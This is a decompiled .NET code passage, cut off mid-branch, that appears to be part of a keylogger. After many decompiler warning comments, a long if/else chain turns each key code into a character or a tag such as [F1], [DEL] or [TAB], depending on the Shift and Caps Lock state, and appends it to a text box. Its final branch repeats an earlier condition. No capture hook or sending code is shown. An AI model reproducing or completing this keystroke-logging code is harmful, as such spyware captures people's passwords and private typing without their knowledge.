		//IL_3a58: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a5b: Invalid comparison between Unknown and I4
		//IL_3a82: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a85: Invalid comparison between Unknown and I4
		//IL_3aac: Unknown result type (might be due to invalid IL or missing references)
		//IL_3aaf: Invalid comparison between Unknown and I4
		//IL_3ad6: Unknown result type (might be due to invalid IL or missing references)
		//IL_3adc: Invalid comparison between Unknown and I4
		//IL_3b03: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b09: Invalid comparison between Unknown and I4
		//IL_3b30: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b36: Invalid comparison between Unknown and I4
		//IL_3b5d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b63: Invalid comparison between Unknown and I4
		//IL_3b8a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b90: Invalid comparison between Unknown and I4
		//IL_3bb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_3bbd: Invalid comparison between Unknown and I4
		//IL_3be4: Unknown result type (might be due to invalid IL or missing references)
		//IL_3bea: Invalid comparison between Unknown and I4
		//IL_3c11: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c17: Invalid comparison between Unknown and I4
		//IL_3c3e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c44: Invalid comparison between Unknown and I4
		//IL_3c6b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c6e: Invalid comparison between Unknown and I4
		//IL_3c95: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c98: Invalid comparison between Unknown and I4
		//IL_3cbf: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cc2: Invalid comparison between Unknown and I4
		//IL_3ce9: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cec: Invalid comparison between Unknown and I4
		//IL_3d13: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d16: Invalid comparison between Unknown and I4
		//IL_3d3d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d40: Invalid comparison between Unknown and I4
		//IL_3d67: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d6a: Invalid comparison between Unknown and I4
		//IL_3d91: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d94: Invalid comparison between Unknown and I4
		//IL_3dbb: Unknown result type (might be due to invalid IL or missing references)
		//IL_3dbe: Invalid comparison between Unknown and I4
		//IL_3de5: Unknown result type (might be due to invalid IL or missing references)
		//IL_3de8: Invalid comparison between Unknown and I4
		//IL_3e0f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e12: Invalid comparison between Unknown and I4
		//IL_3e39: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e3c: Invalid comparison between Unknown and I4
		//IL_3e63: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e66: Invalid comparison between Unknown and I4
		//IL_3e8d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e90: Invalid comparison between Unknown and I4
		//IL_3eb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_3eba: Invalid comparison between Unknown and I4
		//IL_3ee1: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ee3: Invalid comparison between Unknown and I4
		//IL_3f0a: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f0d: Invalid comparison between Unknown and I4
		//IL_3f34: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f37: Invalid comparison between Unknown and I4
		//IL_3f5e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f61: Invalid comparison between Unknown and I4
		//IL_3f88: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f8b: Invalid comparison between Unknown and I4
		//IL_3fb2: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fb5: Invalid comparison between Unknown and I4
		//IL_3fdc: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fdf: Invalid comparison between Unknown and I4
		//IL_4006: Unknown result type (might be due to invalid IL or missing references)
		//IL_4009: Invalid comparison between Unknown and I4
		//IL_4030: Unknown result type (might be due to invalid IL or missing references)
		//IL_4033: Invalid comparison between Unknown and I4
		//IL_405a: Unknown result type (might be due to invalid IL or missing references)
		//IL_405d: Invalid comparison between Unknown and I4
		//IL_4081: Unknown result type (might be due to invalid IL or missing references)
		//IL_4084: Invalid comparison between Unknown and I4
		//IL_40a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_40ab: Invalid comparison between Unknown and I4
		//IL_40cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_40d2: Invalid comparison between Unknown and I4
		if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "a");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "b");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "c");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "d");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "e");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "f");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "g");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "h");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "i");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "j");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "k");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "l");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "m");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "n");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "o");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "p");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "r");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "s");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "t");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "u");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "v");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "w");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "x");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "z");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 96)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 97)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 98)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 99)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 100)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 101)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 102)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 103)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 104)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 105)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[DEL]");
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[DEL]");
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Z");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 96)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 97)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 98)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 99)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 100)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 101)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 102)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 103)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 104)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 105)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[DEL]");
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[Back]");
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "!");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "@");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "#");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "$");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "%");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "^");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "&");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "(");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ")");
			}
			else if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Z");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "<");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "_");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "{");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "}");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "|");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ":");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ">");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "~");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[DEL]");
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[DEL]");
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "a");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "b");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "c");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "d");
			}
			else if ((int)Key == 69)
